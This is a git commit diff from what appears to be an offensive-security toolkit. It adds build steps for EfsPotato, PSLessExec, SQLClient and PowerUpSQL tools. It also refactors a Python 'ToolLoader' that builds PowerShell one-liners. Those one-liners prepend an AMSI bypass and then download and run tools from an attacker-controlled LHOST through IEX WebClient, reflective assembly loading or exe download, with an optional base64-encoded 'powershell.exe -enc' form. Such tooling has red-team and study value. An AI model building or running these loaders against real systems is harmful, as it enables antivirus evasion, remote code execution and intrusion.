efd06d17096ce80a941a37a2e7ceb6a4a0cef562
Andrew Klaus <andrew@aklaus.ca>
2022-06-28 00:59:13 -0400

    Adding powerupsql script automation

--- build_utils.sh
+++ build_utils.sh
@@ -5,7 +5,9 @@ WEBDIR=`grep webroot config.yaml | awk '{print $2}'`
 python3 generate_win_util_EfsPotato.py
 python3 generate_win_util_PSLessExec.py
 python3 generate_win_util_SQLClient.py
+python3 generate_win_util_PowerupSQLScript.py
 
 sudo mv win_pslessexec.exe ${WEBDIR}/tools/PSLessExec.exe
 sudo mv win_sqlclient.exe ${WEBDIR}/tools/SQLClient.exe
 sudo mv win_efspotato.exe ${WEBDIR}/EfsPotato.exe
+sudo mv output_powerupsql.txt ${WEBDIR}/sql.txt
--- generate_tool_loader.py
+++ generate_tool_loader.py
@@ -6,6 +6,82 @@ import os
 import sys
 import yaml
 
+class ToolLoader:
+  def __init__(self, tool_name, amsi_bypass=True):
+    self.amsi_bypass = amsi_bypass
+
+    cs_tools = ak.conf['cs_tools']
+    ps_tools = ak.conf['ps_tools']
+    zip_tools = ak.conf['zip_tools']
+    exe_tools = ak.conf['exe_tools']
+
+    all_tools = list(cs_tools.keys())
+    all_tools += ps_tools.keys()
+    all_tools += zip_tools.keys()
+    all_tools += exe_tools.keys()
+
+    tool,tool_type = get_tool(tool_name, cs_tools, ps_tools, zip_tools, exe_tools)
+
+    if not os.path.exists(ak.WEBROOT + "/" + tool['location']):
+      print("WARNING: Tool not found at: " + ak.WEBROOT + "/" + tool['location'] + "\r\n", file=sys.stderr)
+
+    self.get_tool_cmd(tool, tool_type)
+
+  def get_tool_cmd(self, tool, tool_type):
+    s = ""
+
+    if self.amsi_bypass:
+      s += ak.PS_AMSI + ';'
+
+    if tool_type == 'ps':
+      s += ak.PS_IEX_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool['location'])
+
+      if 'cmd' in tool.keys():
+        cmd = tool['cmd']
+
+      s += ';' + cmd
+
+    elif tool_type == 'cs':
+      tool_class = tool['class']
+      tool_entrypoint = tool.get('entrypoint', "Main")
+      cmd = tool.get('cmd', "")
+
+      cmd = cmd.replace("STAGER_URL", ak.STAGER_URL)
+
+      if len(cmd) > 0:
+        # Arguments must be passed as a list
+        tcmd = f'"{cmd}".Split()'
+        s += ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool['location'], tool_class=tool_class, entrypoint=tool_entrypoint, cmd=tcmd )
+      else:
+        s += ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool['location'], tool_class=tool_class, entrypoint=tool_entrypoint, cmd="")
+
+
+    elif tool_type == 'zip':
+      s += ak.PS_UNZIP_CMD.format(LHOST=ak.LHOST, tool=tool['location'])
+    elif tool_type == 'exe':
+      cmd = tool['cmd']
+      cmd = cmd.replace("LHOST", ak.LHOST)
+
+      s += ak.PS_EXE_DL.format(LHOST=ak.LHOST, tool=tool['location'], cmd=cmd)
+    else:
+      print(f"Invalid type {tool_type} for command {tool}")
+      sys.exit(1)
+
+    if 'method' in tool.keys():
+      s+= ';' + tool['method']
+
+    self.s = s
+
+  def ps_b64(self):
+    b64_encoded = base64.b64encode(self.s.encode('utf-16le'))
+    b64_str = b64_encoded.decode("utf-8")
+    return b64_str
+
+  def ps_cmd(self):
+    return self.s
+
+
+
 def b64_encode(s):
   b64_encoded = base64.b64encode(s.encode('utf-16le'))
   b64_str = b64_encoded.decode("utf-8")
@@ -27,48 +103,6 @@ def get_tool(tool_name, cs_tools, ps_tools, zip_tools, exe_tools):
 
   return tool,tool_type
 
-def get_tool_cmd(tool, tool_type, args, altcmd=None):
-  s = ""
-
-  if args.amsi:
-    s += ak.PS_AMSI + ';'
-
-  if tool_type == 'ps':
-    s += ak.PS_IEX_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool['location'])
-
-    if 'cmd' in tool.keys():
-      cmd = tool['cmd']
-
-    s += ';' + cmd
-
-  elif tool_type == 'cs':
-    tool_class = tool['class']
-    tool_entrypoint = tool.get('entrypoint', "Main")
-    cmd = tool.get('cmd', "")
-
-    cmd = cmd.replace("STAGER_URL", ak.STAGER_URL)
-
-    if len(cmd) > 0:
-      # Arguments must be passed as a list
-      tcmd = f'"{cmd}".Split()'
-      s += ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool['location'], tool_class=tool_class, entrypoint=tool_entrypoint, cmd=tcmd )
-    else:
-      s += ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool['location'], tool_class=tool_class, entrypoint=tool_entrypoint, cmd="")
-
-
-  elif tool_type == 'zip':
-    s += ak.PS_UNZIP_CMD.format(LHOST=ak.LHOST, tool=tool['location'])
-  elif tool_type == 'exe':
-    s += ak.PS_EXE_DL.format(LHOST=ak.LHOST, tool=tool['location'], cmd=tool['cmd'])
-  else:
-    print(f"Invalid type {tool_type} for command {tool}")
-    sys.exit(1)
-
-  if 'method' in tool.keys():
-    s+= ';' + tool['method']
-
-  return s
-
 def main():
   cs_tools = ak.conf['cs_tools']
   ps_tools = ak.conf['ps_tools']
@@ -87,17 +121,14 @@ def main():
 
   args = parser.parse_args()
 
-  tool,tool_type = get_tool(args.tool, cs_tools, ps_tools, zip_tools, exe_tools)
+  tl = ToolLoader(args.tool, amsi_bypass=args.amsi)
 
-  if not os.path.exists(ak.WEBROOT + "/" + tool['location']):
-    print("WARNING: Tool not found at: " + ak.WEBROOT + "/" + tool['location'] + "\r\n", file=sys.stderr)
-
-  s = get_tool_cmd(tool, tool_type, args)
-
+  s = tl.ps_cmd()
 
   if args.base64:
     print("Command encoded: {}".format(s), file=sys.stderr)
     s = b64_encode(s)
+    s = tl.ps_b64()
     print("powershell.exe -enc "+s)
   else:
     print(s + "\n")
